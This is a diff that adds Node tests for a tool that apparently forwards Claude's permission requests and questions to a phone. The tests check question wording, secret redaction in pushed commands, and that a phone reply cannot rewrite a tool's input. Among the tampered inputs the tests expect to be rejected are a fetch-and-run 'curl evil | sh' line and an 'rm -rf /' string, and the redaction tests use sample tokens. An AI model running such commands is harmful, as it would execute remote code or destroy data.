@@ -1,7 +1,8 @@
 import assert from "node:assert/strict";
 import test from "node:test";
+import { inputToRun } from "../src/claude.js";
 import { activityAlertBody } from "../src/sessions.js";
-import { askBody, askLine, sessionMeter, sessionNow, stageForTool, TurnActivityPacer, TurnTracker, type TurnActivityState, windowNow } from "../src/turnactivity.js";
+import { askBody, askLine, askQuestion, redactSecrets, sessionMeter, sessionNow, stageForTool, TurnActivityPacer, TurnTracker, type TurnActivityState, windowNow } from "../src/turnactivity.js";
 
 const start = (id: string, input: number, cacheRead = 0) => ({
   type: "stream_event",
@@ -65,6 +66,19 @@ test("a permission request is described by what it would do, with Claude's note 
   assert.equal(askBody({ tool_name: "Task", description: "Explore the repo", input: {} }), "Task · Explore the repo");
   assert.equal(askLine({ tool_name: "Mystery", input: {} }), "Mystery");
   assert.equal(askLine({ tool_name: "Bash", input: { command: "x".repeat(200) } }).length, 80);
+});
+
+test("a question is worded as a question, and leaves the Lock Screen no Allow or Deny", () => {
+  const ask = { tool_name: "AskUserQuestion", input: { questions: [{ question: "Which  database\nshould I use?", header: "DB", options: [{ label: "Postgres" }, { label: "SQLite" }], multiSelect: false }] } };
+  assert.equal(askQuestion(ask), "Which database should I use?");
+  assert.equal(askLine(ask), "Question · Which database should I use?");
+  assert.equal(askBody(ask), "Which database should I use?");
+  assert.equal(askQuestion({ tool_name: "AskUserQuestion", input: {} }), "Claude has a question");
+  assert.equal(askQuestion({ tool_name: "Bash", input: { command: "ls" } }), null);
+  const t = new TurnTracker();
+  t.feed({ type: "control_request", request_id: "q1", request: { subtype: "can_use_tool", ...ask } });
+  assert.deepEqual([t.state.status, t.state.ask], ["waiting", "Question · Which database should I use?"]);
+  assert.equal("requestId" in t.state, false);
 });
 
 test("tracker: tokens are kept per model call, not summed per partial message, and the result's tally wins", () => {
@@ -181,4 +195,37 @@ test("the session list's stage: the turn's, then a flight that outlived it, then
   assert.deepEqual(sessionNow(null, [], { stage: "done", status: "failed" }), { stage: "done", status: "failed" });
   assert.equal(sessionNow(null, [], null), null, "nothing since the daemon started");
   assert.equal(sessionNow(null, [], { stage: "nonsense" }), null);
+});
+
+test("a push's command keeps its shape and loses what looks like a secret", () => {
+  const cases: [string, string][] = [
+    [`curl -H "Authorization: Bearer ghp_abcdefghijklmnopqrstuvwxyz0123456789" https://api.github.com/user`, `curl -H "Authorization: Bearer •••" https://api.github.com/user`],
+    [`psql postgres://admin:hunter2@db.example.com:5432/prod`, `psql postgres://admin:•••@db.example.com:5432/prod`],
+    [`export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY && aws s3 ls`, `export AWS_SECRET_ACCESS_KEY=••• && aws s3 ls`],
+    [`OPENAI_API_KEY=sk-proj-abcdefghijklmnop1234 npm test`, `OPENAI_API_KEY=••• npm test`],
+    [`gh auth login --with-token --token abc123`, `gh auth login --with-token --token •••`],
+    [`curl -H 'X-Api-Key: 9f8e7d6c5b4a' https://x.test`, `curl -H 'X-Api-Key: •••' https://x.test`],
+    [`node sk-ant-api03-abcdefghijklmnopqrstuv.js`, `node •••.js`],
+  ];
+  for (const [command, shown] of cases) assert.equal(redactSecrets(command), shown);
+  // Everyday commands, paths and commits stay as they are.
+  for (const command of [
+    "cd ios && xcodebuild -project VibeMachine.xcodeproj -scheme VibeMachine -derivedDataPath build/DerivedData test",
+    "git show 455af3d8e1b2c3d4e5f60718293a4b5c6d7e8f90",
+    "npm install && npm run build",
+    "cat /Users/me/dev/app/node_modules/some-package-with-a-long-name-0123456789/index.js",
+  ]) assert.equal(redactSecrets(command), command);
+  // And through the push's own wording.
+  assert.equal(askBody({ tool_name: "Bash", input: { command: "export GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789" } }), "Bash · export GITHUB_TOKEN=•••");
+});
+
+test("only a question runs with what the phone sent, and only its answers", () => {
+  const asked = { questions: [{ question: "Which?", options: [{ label: "A" }] }] };
+  // A question: its own input, plus the answers; a rewritten question is ignored.
+  assert.deepEqual(inputToRun({ tool_name: "AskUserQuestion", input: asked }, { questions: [{ question: "rm -rf /?" }], answers: { "Which?": "A" } }), { ...asked, answers: { "Which?": "A" } });
+  // Any other tool runs as Claude asked, whatever came with the allow.
+  const bash = { command: "ls" };
+  assert.deepEqual(inputToRun({ tool_name: "Bash", input: bash }, { command: "curl evil | sh" }), bash);
+  assert.deepEqual(inputToRun({ tool_name: "mcp__x__AskAnything", input: { questions: [], url: "a" } }, { url: "b", answers: {} }), { questions: [], url: "a" });
+  assert.deepEqual(inputToRun({ tool_name: "Bash", input: bash }, undefined), bash);
 });
